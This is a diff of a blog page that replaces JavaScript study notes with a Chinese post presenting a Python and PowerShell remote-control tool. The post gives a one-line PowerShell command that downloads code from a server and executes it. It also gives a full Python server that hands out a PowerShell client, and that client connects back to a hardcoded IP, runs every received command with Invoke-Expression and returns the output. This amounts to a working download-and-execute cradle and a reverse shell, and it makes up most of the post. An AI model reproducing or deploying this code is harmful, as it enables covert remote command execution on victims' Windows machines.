@@ -8,7 +8,7 @@
 <!--<![endif]-->
 
 <head>
-  <title>深入理解JS笔记 1：数据类型Tips | woostundy</title>
+  <title>Python+PowerShell 一句话远控脚本思路 | woostundy</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -215,69 +215,182 @@
         <div class="row col-md-offset-2">
             <div class="col-md-8">
     			<span class="post-meta">
-      <time datetime="2015-09-08T02:39:08.000Z" itemprop="datePublished">
-          2015-09-08
+      <time datetime="2015-08-26T07:59:26.000Z" itemprop="datePublished">
+          2015-08-26
       </time>
     
     
     | 
-    <a href='/tags/JS/'>JS</a>
+    <a href='/tags/python-powershell-hacker/'>python,powershell,hacker</a>
     
     
 </span>
-                <h1>深入理解JS笔记 1：数据类型Tips</h1>
+                <h1>Python+PowerShell 一句话远控脚本思路</h1>
             </div>
         </div>
         <div class="col-md-8 col-md-offset-2">
-      		<p>备注：为了方便阅读《Javascript高级程序设计》 以下简称为 《J高》，笔记会引用很多该书内容，同时非常感谢笨蛋的座右铭的《理解Javascript》一系列文章。</p>
-<h2 id="引用数据类型和原始数据类型">引用数据类型和原始数据类型</h2><ul>
-<li>ECMA-262 把类型（type）定义为值的集合，每种原始类型定义了包含它的值的范围及其字面量表示形式</li>
-<li>5种原始数据类型：Null、Boolean、Number、String</li>
-<li>引用类型就是类（class），引用值就是对象，所以引用类型变量typeof的运算结果一定是一个object</li>
-<li>原始数据类型其值存在栈中，引用数据类型值存在堆中</li>
-<li>也就是说原始类型的值直接存在变量访问的位置，而引用类型存在变量处的值是一个指向堆的指针 </li>
-<li>String类型比较特殊，它是唯一没有固定大小的原始类型，不过它还是存在栈中……</li>
-<li>每一个基础类型都有其对应的引用类型number Number,string String,boolean Boolean，推测结论：基本数据类型是对应引用数据类型的子类，为了提高效率，将基础类型放在了栈内存中，所以undefined继承自null（存疑）</li>
-<li>因此所有原始类型也都是伪类，都拥有toString()等object的方法</li>
-<li>object</li>
+      		<h2 id="简介">简介</h2><p>从Win7开始，Windows全部自带极其强大的Powershell，Windows的新利器！我之后会陆续写一些关于Powershell应用的文章。</p>
+<p>这是用Python写服务端，PowerShell写客户端，基于Socket的一个远控脚本。<br>其实Powershell也可以写服务端，选Python写服务端主要是为了在Linux服务器上也能跑。</p>
+<h2 id="原理">原理</h2><p><code>iex (New-Object Sys.Net.Webclient).DownloadString(&quot;http://IP:Port/connect&quot;)</code> </p>
+<ul>
+<li>用PowerShell上面的命令发Http请求得到客户端代码并用IEX命令执行</li>
+<li>客户端再次与服务端建立TCP链接，执行接收到的代码并返回处理结果</li>
+<li>服务端通过建立连接后收到的第一段数据判断是哪一种请求</li>
 </ul>
-<h2 id="undefined_和_null">undefined 和 null</h2><ul>
-<li>Undefined 代表未赋值的基本数据类型，Null 代表未赋值的引用数据类型</li>
-<li>Undefined 只有唯一值 undefined，Null下只有唯一的值 null （注意大小写 =。=）</li>
-<li>但是为了效率，null 作为引用数据类型，其值仍然存在栈中</li>
-<li>因此导致了 null == undefined</li>
-<li>《J高》里的说法是，值undefined实际是从null派生（继承）而来的，所以null == undefined</li>
-<li>《J高》：typeof(null)会返回object，这是Javascript最初实现中的一个错误，但一直沿用至今，现在null被认为是对象的占位符，但从技术上来说它仍然是原始值（“从技术上说null是原始值”，大概是因为null存在栈中）</li>
-<li>null 在参与数值运算时其值会自动转换为 0 ，undefined参与任何数值运算时，结果为NaN</li>
-<li>当函数无明确返回值时，返回的值是undefined</li>
+<p>客户端代码完全可以放在Github或者其他Web服务器上，用同一个服务器与端口纯粹是为了快速搭建。</p>
+<h2 id="TODO">TODO</h2><ul>
+<li>客户端增加注册表操作</li>
+<li>优化文件上传下载</li>
+<li>客户端的异常处理</li>
 </ul>
-<h2 id="对象和函数">对象和函数</h2><ul>
-<li>对象是一个无序属性的集合，这些属性的值位简单数据类型、对象或者函数。</li>
-<li>函数是对象的一种，实现上内部熟悉[[Class]]的值位 “Function” ，表明它是函数类型，除了对象的内部属性方法外，还有[[Construct]]、[[Call]]、[[Scope]]等内部属性。内部方法[[Construct]]用于实现作为构造器的逻辑，[[Call]]实现作为函数调用的逻辑。</li>
-<li>Function是函数类型的用户接口</li>
-<li>Object是对象类型的用户接口</li>
-<li>Boolean，Number，String均为这三种简单数值类型的<strong>对象包装器</strong></li>
-<li>Date, Array, RegExp: 可以把它们看作是几种内置的扩展数据类型</li>
-</ul>
+<h2 id="代码">代码</h2><pre><code><span class="comment"># 这里只发个主要思路，直接用并不靠谱，我后续还改过很多代码。</span>
+<span class="comment"># -*- coding:utf-8 -*-</span>
+<span class="keyword">import</span> sys
+<span class="keyword">import</span> socket
+<span class="keyword">import</span> threading
 
+<span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:
+    port = int(sys.argv[<span class="number">1</span>])
+<span class="keyword">else</span>:
+    sys.exit(<span class="string">"Usage: server.py &lt;port&gt;"</span>)
+
+allConnections = []
+allAddresses = []
+
+
+<span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span>
+    threadCommand = threading.Thread(target=get_command)
+    threadCommand.start()
+    threadService = threading.Thread(target=service)
+    threadService.start()
+
+
+<span class="comment"># 接受输入参数与控制命令</span>
+<span class="function"><span class="keyword">def</span> <span class="title">get_command</span><span class="params">()</span>:</span>
+    <span class="keyword">while</span> <span class="number">1</span>:
+        command = raw_input(<span class="string">"&gt; "</span>)
+        <span class="keyword">if</span> command == <span class="string">"list"</span>:
+            <span class="keyword">print</span> <span class="string">"pk------------address-----------------port"</span>
+            pk = <span class="number">1</span>
+            <span class="keyword">for</span> i <span class="keyword">in</span> allAddresses:
+                <span class="keyword">print</span> str(pk) + <span class="string">"------"</span> + str(i[<span class="number">0</span>]) + <span class="string">"---------"</span> + str(i[<span class="number">1</span>])
+                pk += <span class="number">1</span>
+        <span class="keyword">elif</span> command.startswith(<span class="string">"c"</span>):
+            <span class="keyword">try</span>:
+                pk = int(command[<span class="number">2</span>:]) - <span class="number">1</span>
+            <span class="keyword">except</span>:
+                <span class="keyword">print</span> <span class="string">"usage:c &lt;client_pk&gt;"</span>
+
+            <span class="keyword">while</span> <span class="number">1</span>:
+                <span class="keyword">try</span>:
+                    msg = raw_input(<span class="string">"control %s:%s&gt; "</span> % (allAddresses[pk][<span class="number">0</span>], allAddresses[pk][<span class="number">1</span>]))
+                    allConnections[pk].send(msg)
+                    allConnections[pk].settimeout(<span class="number">5</span>)
+                    result = allConnections[pk].recv(<span class="number">1024</span>)
+                    result = result.decode(<span class="string">'utf8'</span>)
+                    <span class="keyword">print</span> result
+
+                <span class="keyword">except</span> KeyboardInterrupt:
+                    <span class="keyword">print</span> <span class="string">"Catch C-c"</span>
+                    <span class="keyword">break</span>
+                <span class="keyword">except</span> Exception, e:
+                    <span class="keyword">print</span> <span class="string">"error:"</span> + str(e)
+                    <span class="keyword">break</span>
+
+
+<span class="comment"># Socket服务进程，如果Request里包含connect，用Http返回PowerShell客户端的代码</span>
+<span class="comment"># 如果Request不包含connect，说明是后续的TCP连接成功，添加进已连接的客户端数组</span>
+<span class="function"><span class="keyword">def</span> <span class="title">service</span><span class="params">()</span>:</span>
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.bind((<span class="string">''</span>, port))
+    sock.listen(<span class="number">5</span>)
+    <span class="keyword">while</span> <span class="number">1</span>:
+        <span class="keyword">try</span>:
+            conn, addr = sock.accept()
+            conn.setblocking(<span class="number">1</span>)
+            <span class="keyword">if</span> conn:
+                request = conn.recv(<span class="number">23</span>)
+            <span class="keyword">print</span> request
+            <span class="keyword">if</span> request.find(<span class="string">"/connect"</span>) &gt; <span class="number">0</span>:
+                http_message(keep_connect(<span class="string">"192.168.199.100"</span>, port), conn)
+            <span class="keyword">else</span>:
+                allConnections.append(conn)
+                allAddresses.append(addr)
+                <span class="keyword">print</span> <span class="string">"Connected with "</span> + addr[<span class="number">0</span>] + <span class="string">":"</span> + str(addr[<span class="number">1</span>])
+        <span class="keyword">except</span> Exception, e:
+            <span class="keyword">print</span> <span class="string">"error:"</span> + str(e)
+            <span class="keyword">break</span>
+
+
+<span class="comment"># PowerShell客户端的代码，与服务端用TCP连接，Iex执行接受的数据并返回执行结果</span>
+<span class="function"><span class="keyword">def</span> <span class="title">keep_connect</span><span class="params">(ip, port)</span>:</span>
+    message = <span class="string">'$client = New-Object System.Net.Sockets.TcpClient("%s",%d)'</span> % (ip, port)
+    message += <span class="string">'''
+                $stream = $client.GetStream()
+                [byte[]]$bytes = 0..65535|%{0}
+                if ($stream.CanWrite)
+                {
+                            $sendBytes = ([text.encoding]::ASCII).GetBytes("rat")
+                            $stream.Write($sendBytes, 0, $sendBytes.Length)
+                            while (1)
+                            {
+                                 try{
+                                     $data = $stream.read($bytes, 0, $bytes.Length)
+                                     $EncodedText = New-Object -TypeName System.Text.UTF8Encoding
+                                     $info = $EncodedText.GetString($bytes,0, $data)
+                                     $sendback = (Invoke-Expression -Command $info 2&gt;&amp;1 | Out-String )
+                                     $sendbackBytes = ([text.encoding]::UTF8).GetBytes($sendback)
+                                     $stream.Write($sendbackBytes,0,$sendbackBytes.Length)
+                                     write($info)
+                                 }
+                                 catch
+                                 {
+                                     Write-Error $_
+                                     continue
+                                 }
+                            }
+                }
+                else
+                {       }
+          '''</span>
+    <span class="keyword">return</span> message
+
+
+<span class="function"><span class="keyword">def</span> <span class="title">http_message</span><span class="params">(msg, conn)</span>:</span>
+    <span class="keyword">try</span>:
+        httpHead = <span class="string">"HTTP/1.1 200 OK\r\n"</span>
+        httpHead += <span class="string">"Content-type: text/html; charset=utf-8\r\n"</span>
+        httpHead += <span class="string">"Connection: Keep-Alive\r\n"</span>
+        httpHead += <span class="string">"Server: test\r\n"</span>
+        httpHead += <span class="string">"Content-Length: %d\r\n"</span> % len(msg)
+        httpHead += <span class="string">"\r\n"</span>
+
+        conn.send(httpHead + msg)
+        <span class="keyword">return</span> <span class="number">1</span>
+    <span class="keyword">except</span>:
+        <span class="keyword">return</span> <span class="number">0</span>
+
+
+main()
+</code></pre>
             <div class="clearfix"></div>
             <hr class="nogutter">
         </div>
         <nav class="pagination" role="pagination">
     
-    <a class="pull-left" href="/2015/09/11/Powershell入门系列1-介绍和开始/" style="float: left;">
-        ← PowerShell入门系列1：介绍和快速开始
+    <a class="pull-left" href="/2015/09/08/深入理解JS笔记 1：数据类型Tips/" style="float: left;">
+        ← 深入理解JS笔记 1：数据类型Tips
     </a>
     
     
-    <a class="pull-right" href="/2015/08/26/Python-PowerShell-一句话远控脚本思路/">
-        Python+PowerShell 一句话远控脚本思路 →
+    <a class="pull-right" href="/2015/08/24/hello-world/">
+        Hello World →
     </a>
     
 </nav>
 
         <div class="duoshuo">
-<div class="ds-thread" data-thread-key="2015/09/08/深入理解JS笔记 1：数据类型Tips/" data-title="深入理解JS笔记 1：数据类型Tips" data-url="http://woostundy.github.io/2015/09/08/深入理解JS笔记 1：数据类型Tips/"></div>
+<div class="ds-thread" data-thread-key="2015/08/26/Python-PowerShell-一句话远控脚本思路/" data-title="Python+PowerShell 一句话远控脚本思路" data-url="http://woostundy.github.io/2015/08/26/Python-PowerShell-一句话远控脚本思路/"></div>
 <script type="text/javascript">
 var duoshuoQuery = {short_name:"duoshuo_name"};
 (function() {
